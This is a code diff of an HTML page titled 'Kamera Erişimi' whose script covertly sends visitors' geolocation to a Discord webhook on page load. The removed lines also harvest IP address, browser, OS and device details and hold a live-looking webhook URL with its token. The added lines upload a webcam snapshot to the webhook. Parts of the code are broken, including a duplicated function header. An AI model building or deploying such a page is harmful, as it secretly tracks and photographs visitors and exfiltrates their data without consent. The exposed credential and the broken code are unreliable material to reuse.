@@ -5,111 +5,68 @@
   </head>
   <body>
     <h1>Kamera Erişimi</h1>
+    <button id="take-picture">Resim Çek</button>
+    <div id="picture-container"></div>
 
     <script>
-      // Request the user's location and send it to the Discord webhook
+      const takePictureButton = document.getElementById('take-picture');
+      const pictureContainer = document.getElementById('picture-container');
+      const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+
+      // Request the user's location
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          // Get the user's IP address
-          const ipUrl = 'https://api.ipify.org?format=json';
-          fetch(ipUrl)
-          .then(response => response.json())
-          .then(data => {
-              const ip = data.ip;
+          // Send the user's location to the Discord webhook
+          const formData = new FormData();
+          formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
 
-              // Get the website information
-              const websiteUrl = window.location.href;
-              const websiteTitle = document.title;
-
-              // Get the system information
-              const userAgent = navigator.userAgent;
-              const platform = navigator.platform;
-              const language = navigator.language;
-              const browserName = getBrowserName(userAgent);
-              const browserVersion = getBrowserVersion(userAgent);
-              const osName = getOSName(platform);
-              const osVersion = getOSVersion(platform);
-              const deviceType = getDeviceType(userAgent);
-              const screenWidth = screen.width;
-              const screenHeight = screen.height;
-              const screenColorDepth = screen.colorDepth;
-              const screenOrientation = screen.orientation;
-
-              // Get the device information
-              const deviceMemory = navigator.deviceMemory;
-              const deviceHardwareConcurrency = navigator.hardwareConcurrency;
-              const deviceCpuArchitecture = getCPUArchitecture(userAgent);
-
-              // Send the user's location, IP address, website information, and system information to the Discord webhook
-              const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
-              const formData = new FormData();
-              formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${browserVersion} - İşletim Sistemi: ${osName} ${osVersion} - Cihaz Bilgisi: ${deviceType} - Ekran Bilgisi: ${screenWidth}x${screenHeight} - Renk Derinliği: ${screenColorDepth} - Ekran Yönü: ${screenOrientation} - Cihaz Belleği: ${deviceMemory} - Cihaz Çekirdek Sayısı: ${deviceHardwareConcurrency} - Cihaz CPU Mimarisi: ${deviceCpuArchitecture}`);
-
-              fetch(webhookUrl, {
-                method: 'POST',
-                body: formData,
-              })
-            .then(response => response.json())
-            .then(data => console.log(data))
-            .catch(error => console.error(error));
-            })
-          .catch(error => console.error(error));
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
         });
       } else {
         console.error('Geolocation is not supported by this browser.');
       }
 
-      // Function to get the browser name from the user agent
-      function getBrowserName(userAgent) {
-        if (userAgent.indexOf('Chrome') > -1) return 'Google Chrome';
-        if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
-        if (userAgent.indexOf('Safari') > -1) return 'Apple Safari';
-        if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
-        return 'Unknown';
-      }
+      takePictureButton.addEventListener('click', async () => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
 
-      // Function to get the browser version from the user agent
-      function getBrowserVersion(userAgent) {
-        const browserVersionRegex = /\b(?:Chrome|Firefox|Safari|Edge)\/([\w.]+)\b/;
-        const match = userAgent.match(browserVersionRegex);
-        return match ? match[1] : 'Unknown';
-      }
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
 
-      // Function to get the OS name from the platform
-      function getOSName(platform) {
-        if (platform.indexOf('Win') > -1) return 'Windows';
-        if (platform.indexOf('Mac') > -1) return 'macOS';
-        if (platform.indexOf('Linux') > -1) return 'Linux';
-        return 'Unknown';
-      }
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Function to get the OS version from the platform
-      function getOSVersion(platform) {
-        const osVersionRegex = /\b(?:Windows|macOS|Linux) ([\w.]+)\b/;
-        const match = platform.match(osVersionRegex);
-        return match ? match[1] : 'Unknown';
-      }
+          const imageData = canvas.toDataURL('image/jpeg');
+          const blob = await fetch(imageData).then(response => response.blob());
+          const formData = new FormData();
+          formData.append('file', blob, 'image.jpg');
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', 'Resim Çekildi!');
 
-      // Function to get the device type from the user agent
-      function getDeviceType(userAgent)
-            // Function to get the device type from the user agent
-      function getDeviceType(userAgent) {
-        if (userAgent.indexOf('Mobile') > -1) return 'Mobile';
-        if (userAgent.indexOf('Tablet') > -1) return 'Tablet';
-        if (userAgent.indexOf('Desktop') > -1) return 'Desktop';
-        return 'Unknown';
-      }
-
-      // Function to get the CPU architecture from the user agent
-      function getCPUArchitecture(userAgent) {
-        if (userAgent.indexOf('x86_64') > -1) return 'x86_64';
-        if (userAgent.indexOf('x86') > -1) return 'x86';
-        if (userAgent.indexOf('ARM') > -1) return 'ARM';
-        return 'Unknown';
-      }
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        } catch (error) {
+          console.error('Error:', error);
+        }
+      });
     </script>
   </body>
 </html>
